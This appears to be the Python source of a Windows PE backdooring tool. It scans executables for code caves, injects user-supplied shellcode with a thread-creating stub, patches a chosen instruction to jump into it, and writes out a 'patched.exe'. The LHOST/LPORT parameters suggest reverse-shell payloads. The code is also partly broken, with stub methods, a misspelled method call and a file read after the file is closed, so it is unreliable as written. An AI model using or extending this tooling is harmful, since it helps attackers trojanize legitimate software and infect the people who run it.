# coding:utf-8

import sys
import os
import subprocess
import lief
import pepatch
import pefile
import struct
from capstone import *
from logginger import *

class pebin():
    """
    PE binary class.
    """
    def __init__(self, FILE, OUTPUT, APPEND_SECTION, SHELLCODE, LHOST, LPORT, CFLAGS,\
                 LEN_SHELLCODE, CAVE_FOUND, JUMP_CAVES, ADDR_PATCH):
        self.FILE = FILE
        self.OUTPUT = OUTPUT
        self.APPEND_SECTION = APPEND_SECTION
        self.SHELLCODE = SHELLCODE
        self.LHOST = LHOST
        self.LPORT = LPORT
        self.CFLAGS = CFLAGS
        self.IS_SUPPORTED = False
        self.LEN_SHELLCODE = LEN_SHELLCODE
        self.CAVE_FOUND = CAVE_FOUND
        self.JUMP_CAVES = JUMP_CAVES
        self.ADDR_PATCH = ADDR_PATCH

        self.ppe = None
        self.lpe = None
        self.binary = None
        self.fItems = {}

        # init fItems

    def support_check(self):
        # check this file if is support
        with open(self.FILE, 'rb') as f:
            f.seek(0)
        magic = f.read(2)
        if magic != '\x4d\x5a':
            logger.critical("This is not a PE file")
            sys.exit(0)
        else:
            return True

    def gather_file_info_win(self):
        pass

    def gather_info(self):
        self.ppe = pefile.PE(self.FILE)
        self.lpe = lief.parse(self.FILE)
        pass

    def find_all_caves(self):
        '''
        This function find all caves in PE file
        Print to screen and return satisfied caves
        :return: cave_space; list
        '''

        if self.SHELLCODE and not self.LEN_SHELLCODE:
            # Here will use rawdata shelcode, asm shcellcode should be asm
            size_of_cave_to_find = len(self.SHELLCODE)
        if not self.LEN_SHELLCODE:
            self.LEN_SHELLCODE = 380
        size_of_cave_to_find = self.LEN_SHELLCODE
        logger.info("Looking for caves")
        begin_cave = 0
        tracking = 0
        count = 1
        cave_tracker = []
        self.binary = open(self.FILE, 'rb')
        self.binary.seek(0)

        while True:
            try:
                s = struct.unpack("<b", self.binary.read(1))[0]
            except Exception as e:
                break
            if s == 0:
                if count == 1:
                    begin_cave = tracking
                count += 1
            else:
                if count >= size_of_cave_to_find:
                    cave_tracker.append((begin_cave, tracking))
                count = 1
            tracking += 1

        for _cave in cave_tracker:
            for _section in self.lpe.sections:
                section_found = False
                if _cave[0] >= _section.pointerto_raw_data and _cave[1] <= (_section.sizeof_raw_data + _section.pointerto_raw_data)\
                    and _cave[1] - _cave[0] >= size_of_cave_to_find:
                    logger.info("\tsection name\t'{0}'".format(_section.name))
                    logger.info("begin of cave\t{0}".format(_cave[0]))
                    logger.info("end of cave\t{0}".format(_cave[1]))
                    logger.info("\tsize if cave\t0x{0:x}".format(_cave[1] - _cave[0]))
                    logger.info("\tsize of raw data\t0x{0:x}".format(_section.sizeof_raw_data))
                    logger.info("\tpointer to raw data\t0x{0:x}".format(_section.pointerto_raw_data))
                    logger.info("\tend of raw data\t0x{0:x}".format(_section.pointerto_raw_data + _section.sizeof_raw_data))
                    logger.info("\t" + "*" * 50)
                    section_found = True
                    break
            if section_found is False:
                try:
                    logger.info("\tNo section")
                    logger.info("\tbegin of cave\t0x{0:x}".format(_cave[0]))
                    logger.info("\tend of cave\t0x{0:x}".format(_cave[1]))
                    logger.info("\tsize of cave\t0x{0:x}".format(_cave[1] - _cave[0]))
                    logger.info("*" * 50)
                except Exception as e:
                    logger.error(e)
        logger.info("\tTotal of {0:s} caves found".format(str(len(cave_tracker))))
        return cave_tracker

    def jump_caves(self):
        pass

    def append_section(self):
        """
        section_text_rawdata = ""
        valid_opt = []

        lief_binary = lief.parse(self.FILE)
        section_test = lief_binary.get_section(".test")
        section_test_content = section_test.content
        for _byte in section_test_content:
            section_text_rawdata += chr(_byte) 
        # patch_address_offset = patch_address - lief_binary.optional_header.imagebase - section_test.virtual_address
        md = Cs(CS_ARCH_X86, CS_MODE_32)

        # here can use module logging
        logger.info("\tHere is valid address")
        # _code (id, address, mnemonic, op_str, size, bytes)
        for _code in md.disasm(section_text_rawdata, lief_binary.optional_header.imagebase + section_test.virtual_address):
            if _code.size == 5:
                valid_opt.append((_code.address, _code.mnemonic, _code.op_str))
                print("0x{0:x}\t{1:s}\t{2:s}".format(_code.address, _code.mnemonic, _code.op_str))
        """
        if not self.ADDR_PATCH:
            logger.error("\t'-a' option should be set, an address should be special to patch.")
            sys.exit(1)
        support_shellcode_type = ['exe', 'dat', 'asm', 'dll', 'c', '']
        if self.SHELLCODE:
            extension = os.path.basename(self.SHELLCODE).split('.')[1]
            if extension in support_shellcode_type:
                shellcode_type = extension
            else:
                logger.error("This is not a support shellcode type, supported type is:\n{0:s}".format("".join(support_shellcode_type, ' ')))
                sys.exit(1)
            with open(self.SHELLCODE, 'r') as f:
                if shellcode_type == 'dat' or shellcode_type == '':
                    shellcode = f.read()
            pt = pepatch.Patcher(self.FILE)
            shellcode_addr = pt.inject(raw=shellcode)

            patched_inst_rawdata = ''
            for i in range(5):
                _patched_inst = self.ppe.get_string_at_rva(self.ADDR_PATCH - self.ppe.OPTIONAL_HEADER.ImageBase + len(patched_inst_rawdata))
                if len(_patched_inst) == 0:
                    patched_inst_rawdata += '\x00'
                else:
                    patched_inst_rawdata += _patched_inst
            logger.debug(patched_inst_rawdata)
            if self.lpe.header.machine == lief.PE.MACHINE_TYPES.I386:
                arch, bits = CS_ARCH_X86, CS_MODE_32
            else:
                arch, bits = CS_ARCH_X86, CS_MODE_64
            md = Cs(arch, bits)
            patched_inst_list = md.disasm(patched_inst_rawdata, 0).next() # [0].mnemonic
            patched_inst = str(patched_inst_list.mnemonic + ' ' + patched_inst_list.op_str)
            logger.debug(patched_inst)


        # pepatcher.Patcher(target, cflags)
        with open(".\\shellcode\\asm\\create_thread.asm", 'r') as f:
            create_thread_asm = f.read()
        create_thread_asm += '\n' + patched_inst + '\n' + 'jmp 0x{0:x}'.format(self.ADDR_PATCH + 5)
        thread_shellcode_addr = pt.inject(asm=create_thread_asm)
        pt.patch(thread_shellcode_addr + 0x8f, jmp=shellcode_addr)
        pt.patch(self.ADDR_PATCH, jmp=thread_shellcode_addr)
        if self.OUTPUT:
            output_filename = self.OUTPUT
        else:
            output_filename = self.FILE + 'patched.exe'
        pt.save(output_filename)

    def run_this(self):
        self.gather_info()
        if self.CAVE_FOUND is True:
            cave_tracker = self.find_all_caves()
        if self.JUMP_CAVES is True:
            cave_tracker = self.fing_add_caves()
        if self.APPEND_SECTION is True:
            self.append_section()
        logger.debug("End")
